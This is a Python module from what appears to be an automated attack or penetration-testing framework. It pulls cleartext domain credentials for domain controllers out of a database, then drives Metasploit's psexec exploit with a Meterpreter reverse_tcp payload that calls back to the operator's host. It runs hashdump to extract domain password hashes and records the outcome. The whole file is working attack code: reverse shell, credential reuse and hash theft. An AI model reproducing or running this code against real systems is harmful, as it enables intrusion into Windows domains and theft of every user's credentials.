import time
from msf import exploit

def run(params):
    sql = """
select
    d.id,
    hd.ip_address,
    dc.domain, dc.username, dc.cleartext_password,
    m.id
from
	host_data hd
    join domains d on d.domain_name = hd.domain
    join domain_credentials_map m on m.host_data_id = hd.id
    join domain_credentials dc on dc.id = m.domain_credentials_id
where
	hd.footprint_id = %s and 
    d.footprint_id = dc.footprint_id and
    d.footprint_id = hd.footprint_id and
    d.footprint_id = m.footprint_id and
    hd.is_dc = 1 and
    m.valid = 1 and
    d.hashes_extracted = 0 and
	m.psexec_failed = 0 and
    d.id not in (select item_identifier from task_list where task_descriptions_id = 21 and footprint_id = %s and in_progress = 1)
"""

#    sql = """
#select 
#    d.id,
#    hd.ip_address,
#    dc.domain, dc.username, dc.cleartext_password,
#    m.id
#from 
#    domains d 
#    join domain_credentials dc on d.domain_name = dc.domain
#    join domain_credentials_map m on m.domain_credentials_id = dc.id
#    join host_data hd on m.host_data_id = hd.id
#where
#    d.footprint_id = dc.footprint_id and
#    d.footprint_id = hd.footprint_id and
#    d.footprint_id = m.footprint_id and
#    m.valid = 1 and    
#    d.hashes_extracted = 0 and
#    m.psexec_failed = 0 and 
#    hd.is_dc = 1 and
#    d.id not in (select item_identifier from task_list where task_descriptions_id = 21 and footprint_id = %s and in_progress = 1) and
#    hd.footprint_id = %s limit 1
#       """
            
    cursor = params.db.cursor()
    cursor.execute(sql, (params.footprint_id, params.footprint_id, ))
    row = cursor.fetchone()
    cursor.close()

    if row != None:
        cursor = params.db.cursor()
        cursor.execute("call addTaskListItem(%s, 21, %s, 1, 0)", (params.footprint_id, row[0], ))
        task_id = cursor.fetchone()[0]
        cursor.close() 
        
        setup = [
            "use exploit/windows/smb/psexec",
            "set PAYLOAD windows/meterpreter/reverse_tcp",
            "set RHOST {0}".format(row[1]),
            "set LHOST {0}".format(params.getLocalHost()),
            "set LPORT {0}".format(params.getOpenPort()),
            "set smbdomain {0}".format(row[2]),
            "set smbuser {0}".format(row[3]),
            "set smbpass {0}".format(row[4]),
            "exploit"
        ]
    
        log = ""
        
        result = exploit.runMsf_ExtractDomainHashes(params, row[0], setup, "hashdump")
        
        if result[0] == False:
            cursor = params.db.cursor()
            cursor.execute("update domain_credentials_map set psexec_failed = 1 where id = %s", (row[5], ))
            cursor.close()
        
        for l in result[1]:
            log = log + l + "\r\n"
            params.log(l)
            
        final_output = ""
        while params.log_queue.empty() == False:
            final_output += "{0}\r\n".format(params.log_queue.get(False))
        final_output = final_output[:-2]
        
        spCursor = params.db.cursor()
        spCursor.execute("call updateTaskStatus(%s, %s, %s, %s)",  ( task_id,  0,  1, final_output, ))
        spCursor.close()
        
        #TODO: create and call a trigger called "Domain hashes extracted"
    #else:
    #    params.log("nothing to check")
